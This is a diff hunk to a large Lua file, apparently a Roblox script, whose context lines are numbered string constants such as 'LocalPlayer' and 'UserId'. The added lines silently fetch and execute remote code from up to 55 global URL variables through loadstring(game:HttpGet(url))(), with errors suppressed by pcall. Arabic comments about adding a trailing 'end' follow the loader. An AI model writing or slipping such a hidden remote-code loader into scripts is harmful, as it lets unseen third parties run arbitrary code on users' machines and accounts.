@@ -9724,3 +9724,17 @@ local STR_9110 = "Players"
 local STR_9111 = "LocalPlayer"
 local STR_9112 = "UserId"
 local STR_9113 = "\",\"server\":\"default_server\"}"
+pcall(function()
+    for i = 1, 55 do
+        local url = _G["URL_" .. i]
+        if url and type(url) == "string" then
+            loadstring(game:HttpGet(url))()
+        end
+    end
+end)
+
+-- إذا كنت تريد إضافة end حرفياً في نهاية الملف (مع أنه غير ضروري)
+-- يمكنك وضع الكود السابق داخل do ... end هكذا:
+do
+    -- الكود أعلاه
+end
